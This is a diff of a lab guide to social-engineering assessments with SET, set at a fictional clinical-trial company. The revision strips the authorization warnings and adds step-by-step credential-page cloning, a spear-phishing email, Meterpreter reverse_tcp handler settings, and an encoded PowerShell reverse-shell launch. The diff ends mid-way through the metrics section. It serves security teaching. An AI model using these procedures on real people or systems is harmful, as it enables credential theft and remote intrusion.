@@ -1,399 +1,576 @@
 # Social Engineering Operations
 
-> **⚠️ AUTHORIZED USE ONLY.** Test only the sites, people, systems, and methods covered by written authorization. Keep emergency exits functional, use harmless proofs, and stop when safety or scope is uncertain. See [Legal and Terms of Use](/legal).
+> A practical SET reference for the NovaMedix academy project: reconnaissance, email authentication, credential harvesting, payloads, spear phishing, PowerShell, campaign metrics, and reporting.
 
-> `A practical reference for authorized assessments of human trust, email controls, simulated phishing, and response readiness.`
+`Use the fictional company, assigned machines, test mailboxes, and dummy credentials. Addresses, messages, and outputs below are illustrative, not results from an executed assessment.`
 
-Social engineering manipulates a person's decisions through a misleading request, identity, or situation. Technical controls matter, but organizations must also make verification and reporting easy. Successful assessments measure how people, processes, and technology work together; they do not assign blame to individual employees.
+## 1. The NovaMedix Attack Chain
 
-**Use these techniques only within explicit written authorization.** Examples use reserved names, dummy accounts, and isolated systems. This reference describes procedures; it does not represent an executed campaign or verified compromise.
+NovaMedix protects sensitive clinical-trial data but has not tested employees' reactions to targeted messages. Demonstrate the chain and identify which controls prevent or detect each stage.
 
-## 1. Core Concepts
-
-| Term | Meaning | Example |
+| Stage | Action | Evidence |
 |---|---|---|
-| Phishing | Deceptive message intended to trigger an unsafe action | A false account notice |
-| Spear phishing | A message tailored to a specific person or group | A department-specific request |
-| Pretext | The story that makes a request seem legitimate | A supposed document review |
-| Vishing | Social engineering through voice calls | An impersonated help desk |
-| Smishing | Phishing through text messages | A false delivery alert |
-| Business email compromise | Fraud using impersonated or compromised business email | A changed payment instruction |
-| Credential harvesting | Collecting credentials through a misleading interface | A copied sign-in page |
-| Payload | Content or code delivered to cause an action | A lab callback program |
-| Listener | A service waiting for a network connection | An assessment callback receiver |
+| Reconnaissance | Identify recipient role and work context | Relevant facts and sources |
+| Email assessment | Inspect SPF, DKIM, DMARC, and headers | DNS responses and received authentication results |
+| Preparation | Clone the lab portal and generate the assigned payload | SET settings and generated files |
+| Delivery | Send a tailored email through SET | Message, SMTP result, and received copy |
+| Interaction | Observe link visits and dummy submissions | Browser requests and harvester output |
+| Execution | Run the assigned payload on the lab endpoint | Process, callback, and session evidence |
+| Assessment | Interpret GoPhish results and report findings | Metrics, limitations, recommendations |
 
-A phishing message may aim for a click, a submitted password, an approval, a file execution, or a financial action. These are different outcomes and require different evidence.
+**Capturing a password does not automatically open a reverse shell.** A payload must execute on an endpoint and reach a compatible listener. Document the delivery and execution step connecting these events.
 
-## 2. Human Behavior and Persuasion
+The exact academy task pages were not supplied. This guide follows the provided project description and learning objectives; use the academy's required filenames and submission formats when available.
 
-Common triggers include authority, urgency, fear of loss, curiosity, reciprocity, familiarity, and social proof. A request can combine several triggers: a familiar sender, an urgent deadline, and a claim that colleagues already complied.
+## 2. Social Engineering and Human Behavior
 
-Analyze a pretext with four questions:
+**Social engineering** manipulates a person into revealing information or performing an unsafe action. It exploits trust and decisions rather than relying only on software vulnerabilities.
 
-1. Who does the sender claim to be?
-2. Why would the recipient believe the claim?
-3. What action is requested?
-4. Which verification step does the request discourage or bypass?
-
-A convincing appearance is not proof of authenticity. Logos, signatures, organizational vocabulary, HTTPS, and polished writing can all appear in malicious messages. Conversely, an awkwardly written message is not automatically malicious.
-
-## 3. Authorization and Assessment Design
-
-Agree on the recipient group, approved identities and domains, schedule and timezone, infrastructure, permitted actions, data retention, and emergency contact. Define which controls will remain active and whether defenders know the timing.
-
-Separate three levels of testing:
-
-| Level | Objective | Suitable evidence |
+| Term | Meaning | NovaMedix example |
 |---|---|---|
-| Awareness simulation | Measure interaction and reporting | Delivery, click, dummy submission, report time |
-| Credential-control test | Assess sign-in protections using test accounts | Authentication logs and approved dummy credentials |
-| Endpoint execution test | Assess execution prevention and response in lab hosts | Process, network, endpoint, and containment evidence |
+| Phishing | Deceptive message asking someone to act | Generic account warning |
+| Spear phishing | Phishing tailored to a person or organization | Trial-document request aimed at a coordinator |
+| Pretext | Story that justifies the request | Scheduled document review |
+| Credential harvesting | Capturing values entered into a misleading form | Cloned portal recording dummy credentials |
+| Payload | Code that performs an action when executed | Lab reverse-shell program |
+| Listener / handler | Service receiving a payload connection | Matching receiver on Kali |
 
-Approval for an awareness email does not automatically authorize executing code on employee systems. Define stop conditions such as real credential collection, delivery outside the approved group, unexpected service impact, or exposure of sensitive records. Test the stop procedure before launch.
+Common triggers are **authority** (IT or a manager), **urgency** (a deadline), **fear** (losing access), **familiarity** (normal company wording), and **curiosity** (a new document).
 
-## 4. Lab Architecture and Evidence Plan
+Explain each pretext using four points: claimed identity, reason it seems believable, requested action, and verification step the recipient overlooks.
 
-Use an isolated sender, a local SMTP test service, a controlled landing page, test mailboxes, and a disposable Windows VM for endpoint exercises. Keep administration interfaces reachable only from the management network. Snapshot systems and synchronize clocks.
+A spear-phishing message can be sent to one person with a module called Mass Mailer. Its targeting and content determine whether it is spear phishing, not the module name.
 
-An illustrative flow is:
+## 3. Reconnaissance
+
+Use the fictional company profile and assigned recipients to build a relevant work context.
+
+| Information | Why it matters |
+|---|---|
+| Recipient name and role | Relevant greeting and requested action |
+| Department and workflow | Believable document or task |
+| Email format | Expected sender/recipient structure |
+| Portal and domain names | Compare legitimate and misleading identities |
+| Communication conventions | Recognize normal signatures and requests |
+
+Illustrative notes:
 
 ```text
-Approved test sender → test mailbox → controlled page
-                                     ↓
-                               dummy submission
-
-Separate endpoint exercise:
-Disposable VM → lab callback listener → defender investigation
+Recipient: alex@novamedix.test
+Role: clinical-trial coordinator
+Normal activity: reviewing trial documents
+Pretext: document ready for review
+Source: fictional company profile provided with the lab
 ```
 
-The two branches may be evaluated independently. A page submission does not establish code execution.
+These are synthetic examples. Present only actually collected observations as reconnaissance results.
 
-Record tool versions, configuration, artifact hashes, campaign identifiers, timestamps, and limitations. Use UTC in raw evidence, with a stated timezone in narrative timelines. Do not include passwords, session cookies, access tokens, or complete recipient lists in general reports.
+## 4. SPF, DKIM, and DMARC
 
-## 5. Reconnaissance and Pretext Selection
+These mechanisms evaluate email domain identities. They do not guarantee that a message is harmless.
 
-Within scope, review public organizational pages, role descriptions, published contact formats, and normal communication patterns. Record where each observation came from and when it was collected. Public availability does not remove privacy obligations.
-
-Prefer the smallest amount of information needed to test the agreed hypothesis. A hypothesis might be: “Recipients will follow a document-review link when it appears to originate from a familiar internal function.” Define what evidence would support or contradict it.
-
-Avoid sensitive personal themes and unnecessary personal profiling. A fictional organization can use invented departments and synthetic recipient data. Keep the material independent of real patient, clinical, or employee information.
-
-## 6. Email Identity and Header Analysis
-
-Email has several identities that may differ:
-
-| Identity | Where it appears | Why it matters |
+| Mechanism | What it checks | Remember |
 |---|---|---|
-| Display name | Mail client sender label | Easy to imitate |
-| Author address | `From:` header | Domain DMARC evaluates |
-| Reply destination | `Reply-To:` header | Replies may go elsewhere |
-| Envelope sender | SMTP `MAIL FROM`, often represented by `Return-Path` | Identity SPF normally evaluates |
-| DKIM signing domain | `d=` in `DKIM-Signature` | Domain responsible for the signature |
+| **SPF** | Is the sending IP authorized for the envelope sender's domain? | Normally checks SMTP `MAIL FROM`, not visible `From:` |
+| **DKIM** | Is the message's domain signature valid? | `d=` identifies the signer; `s=` identifies its DNS selector |
+| **DMARC** | Does passing SPF or DKIM align with the visible `From:` domain? | At least one aligned pass is enough |
 
-Examine full headers from the receiving system. Trust authentication results added by your receiving infrastructure, rather than an arbitrary `Authentication-Results` field supplied upstream. Preserve the original message for analysis.
+**Alignment** means the authenticated domain matches the author domain under the strict or relaxed rule. SPF passing for an unrelated domain does not authenticate a forged NovaMedix author address.
 
-Illustrative header excerpt:
+### DNS checks on Kali
+
+Replace reserved example names with the assigned domain. `.test` names need the lab's DNS configuration.
+
+```bash
+dig TXT novamedix.test +short
+dig TXT _dmarc.novamedix.test +short
+dig TXT selector1._domainkey.novamedix.test +short
+```
+
+`TXT` selects text records. `+short` reduces output formatting. Use the real `s=` selector from a received DKIM signature instead of assuming `selector1`.
+
+Illustrative SPF record:
 
 ```text
-From: Document Review <review@training.example>
-Reply-To: support@training.example
-Return-Path: <bounce@mailer.training.example>
+"v=spf1 ip4:192.0.2.25 -all"
+```
+
+It authorizes the documentation IP `192.0.2.25`. `-all` produces fail for other senders; `~all` means softfail. `+all` authorizes every IP and undermines the restriction.
+
+Illustrative DMARC record:
+
+```text
+"v=DMARC1; p=none; rua=mailto:dmarc@novamedix.test"
+```
+
+| Policy | Requested handling of DMARC failures |
+|---|---|
+| `p=none` | Monitor without requesting quarantine or rejection |
+| `p=quarantine` | Treat suspiciously, commonly by sending to spam |
+| `p=reject` | Reject |
+
+The receiver makes the final handling decision. DNS policy is configuration evidence; received-message evidence establishes actual handling.
+
+### Received-header interpretation
+
+```text
+From: NovaMedix IT <it@novamedix.test>
+Return-Path: <sender@mailer.example>
 Authentication-Results: mx.receiver.example;
- spf=pass smtp.mailfrom=mailer.training.example;
- dkim=pass header.d=training.example;
- dmarc=pass header.from=training.example
+ spf=pass smtp.mailfrom=mailer.example;
+ dkim=pass header.d=mailer.example;
+ dmarc=fail header.from=novamedix.test
 ```
 
-This example is fabricated. A pass authenticates a domain relationship; it does not prove the message is benign.
+SPF and DKIM pass for `mailer.example`, but neither aligns with `novamedix.test`, so DMARC fails. Trust results added by your receiving system, not an arbitrary sender-supplied authentication header.
 
-## 7. SPF, DKIM, and DMARC
+Sources: [SPF specification](https://www.rfc-editor.org/rfc/rfc7208), [DKIM specification](https://www.rfc-editor.org/rfc/rfc6376), [DMARC specification](https://www.rfc-editor.org/rfc/rfc9989.html).
 
-| Mechanism | What it checks | Main limitation |
+## 5. Email Spoofing and Typosquatting
+
+**Email spoofing** makes a message appear to come from a different sender. In SET's mailer, display name and `From:` fields affect the identity shown to the recipient; SMTP and receiving controls can reject or rewrite them.
+
+| Technique | Example | Misleading element |
 |---|---|---|
-| SPF | Whether the connecting sender IP is authorized for the envelope domain | Does not authenticate the visible `From:` on its own; forwarding can affect results |
-| DKIM | A domain signature over selected headers and the body | A valid signature does not establish benign intent; modifications may break it |
-| DMARC | Whether a passing SPF or DKIM identity aligns with the author domain | Does not prevent lookalike-domain messages or abuse of a compromised account |
+| Display-name spoofing | `NovaMedix IT <sender@example.test>` | Trusted name, different address |
+| Domain spoofing | Unauthorized sender claims `it@novamedix.test` | Claimed author domain |
+| Typosquatting | `novarnedix.test` instead of `novamedix.test` | `rn` resembles `m` |
+| Misleading subdomain | `novamedix.test.portal.example` | Trusted text inside another domain |
 
-DMARC passes when **at least one** of SPF or DKIM passes with the required alignment. A passing SPF result for an unrelated domain does not satisfy DMARC. Relaxed alignment generally allows domains in the same organizational domain; strict alignment requires exact domain matches.
+A lookalike domain can pass SPF, DKIM, and DMARC for its own domain. That does not make it the real NovaMedix domain.
 
-The policies `none`, `quarantine`, and `reject` express increasingly restrictive handling preferences for DMARC failures. Receiver policy can still affect disposition. `p=none` supports observation but does not request rejection. The protocol was updated in May 2026: RFC 9989 replaces RFC 7489 and RFC 9091. See the [current DMARC specification](https://www.rfc-editor.org/rfc/rfc9989.html).
+Spoofing supports the pretext; it does not automatically bypass spam filters, encrypt mail, or give access to the impersonated mailbox.
 
-Inspect records for an owned lab domain, substituting its real name:
+## 6. Install SET and Prepare the Lab
 
-```bash
-# Inspect published SPF and other TXT records.
-dig TXT training.example +short
+The **Social-Engineer Toolkit (SET)** is an open-source penetration-testing framework focused on social engineering. **David Kennedy**, founder of **TrustedSec**, created it. TrustedSec is the project organization.
 
-# Inspect DMARC at its dedicated DNS name.
-dig TXT _dmarc.training.example +short
-
-# Use the selector found in an actual DKIM-Signature header.
-dig TXT selector1._domainkey.training.example +short
-```
-
-These reserved example names need not resolve. An empty response alone does not prove a vulnerability: check the queried name, DNS errors, DKIM selector, and DMARC policy discovery. Finding a weak record is configuration evidence, not proof that a particular message reached an inbox.
-
-## 8. Spoofing and Lookalike Domains
-
-**Display-name spoofing** changes the sender label. **Domain spoofing** claims another domain in the visible address. **Typosquatting** uses a different domain with a small spelling change. Homoglyphs use visually similar characters; misleading subdomains exploit how people read domain names.
-
-For example, in `signin.training.example.attacker.test`, the string `training.example` is a subdomain label sequence, not the owning domain. Always identify the actual domain boundary, including multi-label public suffixes when relevant.
-
-An attacker-controlled lookalike can pass SPF, DKIM, and DMARC for its own domain. Defenses therefore also need domain awareness, independent verification, URL analysis, and account protections. For simulations, use organization-owned training infrastructure rather than registering confusing names without explicit approval.
-
-## 9. SET Setup and Navigation
-
-The Social-Engineer Toolkit (SET) is a guided framework for authorized social-engineering assessments. Its modules include website attack vectors, mail delivery, and payload-related workflows. Dependencies and menus vary by release; follow the installed version's labels rather than memorizing numeric choices.
-
-On Kali, install and launch manually:
+### Install and launch on Kali
 
 ```bash
-# Refresh package information.
 sudo apt update
-
-# Install the distribution's SET package.
 sudo apt install set
-
-# Record the installed package version.
 dpkg-query -W set
-
-# Open the interactive console; this does not authorize starting a campaign.
 sudo setoolkit
 ```
 
-Inspect each module before starting it: identify network listeners, interfaces, output files, and any automatic launch behavior. Do not use unrelated attack vectors just because they appear in the menu. Installation and console usage are documented in the [official SET repository](https://github.com/trustedsec/social-engineer-toolkit).
+| Command | Purpose |
+|---|---|
+| `sudo apt update` | Refresh package information |
+| `sudo apt install set` | Install Kali's package named `set` |
+| `dpkg-query -W set` | Record the installed version |
+| `sudo setoolkit` | Launch SET with root privileges |
 
-## 10. SET Credential Harvester Exercise
+The normal Kali workflow requires **root**, supplied through `sudo`. This is the tool's privilege on Kali; it does not make a target session an administrator.
 
-Use a simple sign-in page that you own and a dummy password unique to this exercise. Avoid external identity providers and real organizational login pages for the initial practice.
+Sources: [TrustedSec overview](https://trustedsec.com/resources/tools/the-social-engineer-toolkit-set), [Kali SET documentation](https://www.kali.org/tools/set/).
 
-Typical menu labels are **Social-Engineering Attacks → Website Attack Vectors → Credential Harvester Attack Method → Site Cloner**. Confirm the wording in your installed release.
+### Keep lab addresses clear
 
-1. Start the source page on an isolated lab server. Check that its form uses a normal HTML submission.
-2. Select the credential-harvester workflow and the clone option.
-3. Supply the lab address reachable by the test browser and the URL of your owned source page.
-4. Inspect the resulting HTML, form destinations, scripts, and external resource references before browsing it.
-5. Submit a dummy username and password from the test browser.
-6. Compare the browser request with the harvester's output. Record only redacted evidence.
-7. Stop the service and remove the dummy data according to the retention plan.
+| Component | Illustrative value | Purpose |
+|---|---|---|
+| Kali / SET | `192.168.56.10` | Cloned page and callback destination |
+| Windows endpoint | `192.168.56.20` | Test browser and payload execution |
+| Source website | `http://192.168.56.30/` | Page SET copies |
+| SMTP server | `192.168.56.40` | Lab email delivery |
+| Callback port | `4444` | Payload-to-listener connection |
 
-A copied page may look correct while failing to submit. JavaScript-heavy pages, single-sign-on redirects, content security policy, and missing resources can break cloning. A clone does not recreate the legitimate authentication backend, bypass MFA, or prove the collected string would authenticate.
+These are example assignments, not existing services. Use actual addresses from the designated isolated lab. On Apple Silicon, verify Windows VM and payload architecture compatibility; Kali's architecture does not determine the target payload architecture.
 
-**Success condition:** a known dummy submission appears in the lab receiver with a matching timestamp. Page appearance alone is insufficient.
-
-## 11. SET Mailer and Message Construction
-
-SET's **Mass Mailer Attack** workflow can send assessment messages through a configured SMTP service. The name does not mean large-scale delivery is required. Start with one test mailbox and an SMTP sink; do not use an unrestricted relay.
-
-Configure the approved sender identity, SMTP endpoint and authentication, single test recipient, subject, body, and controlled link. Review the generated message and destination before delivery. Keep credentials out of screenshots and shared configuration files.
-
-A safe practice message can explicitly identify the exercise:
-
-```text
-Subject: Training exercise: review a sample document
-
-Hello Test User,
-
-This is a scheduled security training message. Open the document-review
-page on the isolated training portal and use the supplied dummy account.
-Do not enter a real password.
-
-Training team
+```bash
+ip -br addr
+ip route get 192.168.56.20
 ```
 
-For an authorized susceptibility assessment, approve the pretext and wording in advance. Measure whether the recipient follows the requested action; do not increase realism by collecting real secrets or adding unapproved executable attachments.
+`ip -br addr` briefly lists interface addresses. `ip route get` shows the route and source address toward the endpoint; a field such as `src 192.168.56.10` identifies that source.
 
-A successful SMTP submission means the server accepted a message for processing. It does not prove inbox placement, reading, or human interaction. Check receiver-side evidence and classify bounces separately.
+`127.0.0.1` on the endpoint means the endpoint itself. `0.0.0.0` is a listener bind wildcard, not a destination to embed in another VM's callback.
 
-## 12. Payloads, Listeners, and Reverse Shells
+## 7. SET Menu Map
 
-A reverse shell makes an outbound connection from a host and exposes command execution through that connection. A listener accepts the callback. This differs from a bind shell, where the target listens for inbound connections.
+Choose **1) Social-Engineering Attacks** from the main menu. These options are then inside its submenu:
 
-SET's payload-generation workflows may offer executable payloads and compatible handlers. Available choices depend on the installed version and external components. Before an isolated endpoint exercise, document:
+| Choice | Module | Project purpose |
+|---|---|---|
+| **1** | Spear-Phishing Attack Vectors | Separate file-format/template workflows |
+| **2** | Website Attack Vectors | Reach Credential Harvester |
+| **4** | Create a Payload and Listener | Generate payload and handler |
+| **5** | Mass Mailer Attack | Send project email |
+| **9** | PowerShell Attack Vectors | Generate PowerShell content |
+| **99** | Return | Go back |
 
-- Target OS and architecture.
-- Payload type and matching handler type.
-- Callback address reachable from the disposable target.
-- Callback port, bind interface, and permitted network path.
-- Artifact hash, expiration or teardown procedure, and allowed validation commands.
+Paths starting from SET's main menu:
 
-A listener's bind address and the payload's callback address serve different purposes. `0.0.0.0` is a bind wildcard, not a useful destination to embed in a target callback. A private address also will not become externally reachable merely by entering it in SET.
+| Task | Choices | Labels |
+|---|---|---|
+| Clone login page | **1 → 2 → 3 → 2** | Social-Engineering → Website → Credential Harvester → Site Cloner |
+| Generate payload | **1 → 4** | Social-Engineering → Create a Payload and Listener |
+| Send email | **1 → 5 → 1** | Social-Engineering → Mass Mailer → Single Email Address |
+| PowerShell options | **1 → 9** | Social-Engineering → PowerShell Attack Vectors |
 
-Keep generated payloads inside the isolated lab. Do not email them to live recipients as an extension of an awareness simulation. Use only approved manual execution in the disposable host, validate the agreed identity command, then end the session. Avoid persistence, privilege escalation, credential access, and sensitive files.
+Use numbers and labels together. If your release differs, follow its displayed labels.
 
-**Evidence ladder:** file generated → file delivered → process executed → network callback → interactive command result. Record the highest step actually observed. A TCP connection alone does not prove an active shell; a shell alone does not prove access to sensitive data.
+Source: [SET menu definitions](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/menu/text.py).
 
-## 13. Encoded PowerShell
+## 8. Credential Harvester: Clone and Capture
 
-Windows PowerShell's `-EncodedCommand` accepts Base64 representing UTF-16LE command text. Encoding transports text; it is neither encryption nor an assurance of safety. An encoded command may be harmless or malicious. See [Microsoft's PowerShell command-line documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1).
+**Purpose:** host a copy of the lab login page and record submitted form values. This is harvesting, not password cracking.
 
-Practice encoding with a harmless local marker in Windows PowerShell:
+### Select the workflow
+
+1. Launch `sudo setoolkit`.
+2. Choose **1) Social-Engineering Attacks**.
+3. Choose **2) Website Attack Vectors**.
+4. Choose **3) Credential Harvester Attack Method**.
+5. Choose **2) Site Cloner**.
+
+### Enter the values
+
+| Prompt meaning | Example | Reason |
+|---|---|---|
+| IP for POST-back | `192.168.56.10` | Form data returns to Kali |
+| Website to clone | `http://192.168.56.30/` | Source page, not callback destination |
+| NAT/forwarding, if asked | Match the lab topology | Same-network VMs normally need no external forwarding |
+
+Read SET's printed listener address and port. From Windows, open the **copy on Kali**, such as `http://192.168.56.10/` when SET uses HTTP port 80.
+
+Submit assigned dummy values. Simplified illustrative capture:
+
+```text
+username=alex.lab
+password=NovaMedix-Lab-Only!
+```
+
+This proves those values reached the harvester. It does not prove the password works elsewhere or that MFA was bypassed.
+
+### Find evidence
+
+Common root-run locations include `/root/.set/web_clone/` for the page and `/root/.set/reports/` for module reports. Logging can use installation logs or Apache's directory instead. Follow paths printed by the run.
+
+```bash
+sudo ls -lah /root/.set/web_clone/
+sudo ls -lah /root/.set/reports/
+```
+
+`ls -lah` lists hidden entries, permissions, timestamps, and readable sizes. Save a redacted capture with its timestamp.
+
+If the page displays but captures nothing, inspect form action, browser POST, and field names. JavaScript-heavy pages and external single sign-on may not become working local forms.
+
+Source: [SET harvester implementation](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/webattack/harvester/harvester.py).
+
+## 9. Create a Payload and Listener
+
+A **reverse shell** connects outward from the endpoint to Kali. A **bind shell** listens on the endpoint. **Meterpreter** provides a Metasploit agent interface rather than an ordinary command prompt.
+
+### Generate through SET
+
+1. Choose **1 → 4**, Create a Payload and Listener.
+2. Select the assigned payload matching endpoint OS and architecture.
+3. Enter callback IP / **LHOST**, for example `192.168.56.10`.
+4. Enter callback port / **LPORT**, for example `4444`.
+5. Record payload name and generated file path.
+6. Start the matching listener when offered, before endpoint execution.
+
+| Setting | Meaning |
+|---|---|
+| `PAYLOAD` | Specific payload type; handler must match |
+| `LHOST` | Callback destination embedded in this lab payload |
+| `LPORT` | Callback destination port, matching the listener |
+
+**`4444` is the common training answer and example used here.** The port is configurable. Some SET workflows offer other defaults, including `443`; read the actual prompt.
+
+### Understand meta_config
+
+In the classic Metasploit-backed workflow, **`/root/.set/meta_config`** contains handler commands. It is a **listener resource/configuration file**, not the payload executable. Other backends may generate different artifacts.
+
+```bash
+sudo cat /root/.set/meta_config
+```
+
+Illustrative contents for one specific payload:
+
+```text
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.56.10
+set LPORT 4444
+exploit -j
+```
+
+`exploit/multi/handler` receives the matching Metasploit payload. `exploit -j` starts it as a background job. This is not a universal handler configuration for every SET payload.
+
+If SET has not already started the handler, load the generated resource file:
+
+```bash
+sudo msfconsole -r /root/.set/meta_config
+```
+
+`-r` reads a resource file. Avoid a second listener on an occupied port. The executable/script is separate: use SET's printed output path.
+
+File generation does not prove execution. Look for an endpoint process, callback, and successful command response.
+
+Source: [SET module dispatcher](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/set.py). Exact payload names and artifacts depend on the installed release.
+
+## 10. Send Spear Phishing with Mass Mailer
+
+**Purpose:** deliver a tailored NovaMedix message to the assigned lab mailbox through the configured SMTP server.
+
+### Select and configure
+
+1. Choose **1) Social-Engineering Attacks → 5) Mass Mailer Attack**.
+2. Choose **1) E-Mail Attack Single Email Address** for the first test.
+3. Select **One-Time Use Email Template** to write interactively.
+4. Supply subject and plain-text/HTML body. Where requested, finish with `END` on its own line.
+5. Enter the assigned recipient.
+6. Select your lab SMTP server; supply address, port, and required credentials.
+7. Enter the exercise's sender address and display name.
+8. Add the controlled page link or task-required attachment, verify destinations, and complete delivery.
+
+Prompt order varies. “Use your own server or open relay” is a menu label: use the provided lab server. Common SMTP ports include `25` for relay and `587` for authenticated submission; your configured server determines port and TLS requirements.
+
+### Fictional message
+
+```text
+From: NovaMedix Document Review <review@novamedix.test>
+To: alex@novamedix.test
+Subject: Trial document ready for your review
+
+Hi Alex,
+
+The revised trial document is ready for the coordinator review.
+Please check it before our next team meeting:
+
+http://192.168.56.10/
+
+Thanks,
+Document Review Team
+NovaMedix
+```
+
+Role-specific work makes this spear phishing. Company identity supplies familiarity; the meeting supplies a deadline. A visible lab IP makes the destination easy to trace in class.
+
+For endpoint execution, use the assigned payload and host. Opening email does not automatically execute its `.ps1` or `.exe` attachment. Record the action that actually starts execution.
+
+### Interpret delivery
+
+SMTP acceptance means the server accepted a message for processing. Verify mailbox arrival and inspect full headers, quarantine, and filtering. SET constructing a spoofed sender does not guarantee receiver acceptance.
+
+SET delivery does not automatically create GoPhish metrics. Attribute results to the tool and run that produced them.
+
+Source: [SET Mass Mailer implementation](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/phishing/smtp/client/smtp_web.py).
+
+## 11. PowerShell Payloads and Encoding
+
+**PowerShell** is a Windows shell and scripting environment. **`.ps1`** identifies a script file. An **encoded command** represents command text as Base64; encoding is separate from filename.
+
+### Generate with SET
+
+Choose **1 → 9**, PowerShell Attack Vectors. Traditional options include:
+
+| Choice | Label | Purpose |
+|---|---|---|
+| **1** | Powershell Alphanumeric Shellcode Injector | PowerShell shellcode/encoded-launcher workflow |
+| **2** | Powershell Reverse Shell | Generate a PowerShell reverse-shell script |
+| **3** | Powershell Bind Shell | Generate a script listening on the target |
+| **4** | Powershell Dump SAM Database | Credential-database workflow, outside this shell exercise |
+
+For the basic reverse shell, choose **2**, supply Kali's reachable IP and selected port, then start the compatible listener when prompted. For an explicitly required encoded/injection workflow, inspect **1** and match payload and architecture.
+
+Outputs commonly go under `/root/.set/reports/powershell/`. Read the printed path. Some versions export script/launcher content as `.txt`; SET does not always create a ready-to-run encoded `.ps1`.
+
+```bash
+sudo ls -lah /root/.set/reports/powershell/
+```
+
+Inspect what was generated:
+
+- **Script body:** can be saved as the task's `.ps1` file.
+- **`powershell.exe ... -EncodedCommand ...` launcher:** a command invoking PowerShell; not every output file is itself Base64.
+- **Shellcode:** needs its intended loader and handler. A plain TCP listener is not interchangeable with a Meterpreter handler.
+
+Source: [SET PowerShell menu definitions](https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/menu/text.py). Exported filenames must be confirmed in the actual lab; they were not runtime-validated while preparing this guide.
+
+### Encode a SET-generated script
+
+If the task requires an encoded reverse-shell command and SET produced a **PowerShell script body**, save the reviewed body on the assigned Windows endpoint as `novamedix-lab.ps1`. In Windows PowerShell:
 
 ```powershell
-$command = 'Write-Output "TRAINING_MARKER"'
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$script = Get-Content -Raw .\novamedix-lab.ps1
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
 $encoded = [Convert]::ToBase64String($bytes)
 
-# Inspect the decoded text before running it.
+# Verify that decoding reproduces the original script.
 [System.Text.Encoding]::Unicode.GetString(
     [Convert]::FromBase64String($encoded)
-)
+) -eq $script
+```
 
-# Run only the marker command created above.
+`-Raw` reads one string. Here `.NET Encoding.Unicode` produces **UTF-16LE**, required by Windows PowerShell's `-EncodedCommand`. The comparison should print `True`; that checks a round trip, not safety or execution success.
+
+With the corresponding listener running, execute the task's script on the lab endpoint:
+
+```powershell
 powershell.exe -NoProfile -EncodedCommand $encoded
 ```
 
-Illustrative expected output from the final command:
+`-NoProfile` avoids profile scripts. `-EncodedCommand` decodes and executes the text. This step encodes the SET-generated script; it does not claim SET's reverse-shell option automatically encoded it.
+
+**Base64 is encoding, not encryption.** It does not guarantee antivirus evasion, bypass application control, or grant administrator privileges. If execution is blocked, preserve the alert as a result.
+
+Source: [Microsoft Windows PowerShell parameters](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1).
+
+## 12. Session Validation and Troubleshooting
+
+Verify a session with a small command and response.
+
+| Interface | Verification | Establishes |
+|---|---|---|
+| Windows command shell | `whoami`, then `hostname` | Executing user and host |
+| PowerShell | `whoami`, then `$env:COMPUTERNAME` | Executing user and host |
+| Meterpreter | `getuid`, then `sysinfo` | Agent identity and system |
+
+Illustrative output:
 
 ```text
-TRAINING_MARKER
+C:\Users\LabUser>whoami
+novamedix-lab\labuser
+
+C:\Users\LabUser>hostname
+NOVAMEDIX-LAB
 ```
 
-In SET, inspect the available PowerShell payload workflow and its output in the isolated lab. Identify the decoded instructions, destination, port, execution context, and compatible listener before any approved execution. This harmless encoding example does not create a reverse shell or establish that a SET payload will execute.
+This supports command execution under that identity on the lab endpoint. It does not prove administrator access or access to clinical records. Record the timestamp and close the session after the required proof.
 
-Defenders should investigate process ancestry, decoded script content, network activity, and endpoint events together. `-EncodedCommand` by itself is a lead, not a verdict. Do not disable endpoint protections merely to produce a successful demonstration.
+### Check Kali's listeners
 
-## 14. GoPhish Campaign Workflow
-
-GoPhish combines recipient groups, email templates, landing pages, sending profiles, and campaign tracking. Create a single-recipient test campaign before any approved group delivery.
-
-1. Restrict the administration interface and configure the approved mail relay.
-2. Add synthetic recipients to a test group.
-3. Create an email template using the campaign URL placeholder `{{.URL}}`.
-4. Create an owned landing page and preview it.
-5. Leave password capture disabled; prefer a dummy action or submission marker.
-6. Select the group, template, page, sending profile, campaign URL, and schedule.
-7. Verify delivery, tracking, reporting, and cleanup with the test mailbox.
-8. Launch only the approved scope, then export evidence and reconcile results.
-
-GoPhish uses a recipient identifier, commonly the `rid` parameter, to select campaign context. A generic visit without it may return 404. This does not necessarily mean the campaign page is broken. Treat tracked URLs as sensitive because forwarding them can misattribute activity.
-
-GoPhish documentation warns that captured credentials are stored in plaintext. Disabling password capture does not automatically prevent other form fields from being stored; inspect the whole form and submission configuration. See the official [landing-page documentation](https://docs.getgophish.com/user-guide/documentation/landing-pages) and [campaign documentation](https://docs.getgophish.com/user-guide/documentation/campaigns).
-
-## 15. Metrics and Interpretation
-
-Choose denominators before launching. Count unique recipients for recipient rates, and keep repeat events separately. An SMTP “sent” status is not a direct measurement of inbox delivery.
-
-| Metric | Example definition | Caveat |
-|---|---|---|
-| Send acceptance | SMTP-accepted messages / attempted messages | Not confirmed inbox placement |
-| Open rate | Unique tracked opens / accepted recipients | Image blocking and automated fetching distort it |
-| Click rate | Unique tracked clickers / accepted recipients | Link scanners can click automatically |
-| Submission rate | Unique dummy submitters / accepted recipients | Test traffic and forwarding can affect attribution |
-| Click-to-submit rate | Unique submitters / unique clickers | State how unmatched events are treated |
-| Reporting rate | Unique reporters / accepted recipients | Often needs help-desk or reporting-button data |
-| Time to report | First valid report time minus agreed start event | State whether measured from send or receipt |
-| Response time | First containment action minus detection time | Requires defender evidence |
-
-Illustrative dataset: 100 attempts, 5 immediate failures, 95 SMTP acceptances, 30 unique tracked opens, 12 unique clickers, 3 dummy submitters, and 20 reporters.
-
-```text
-Click rate       = 12 / 95 × 100 = 12.6%
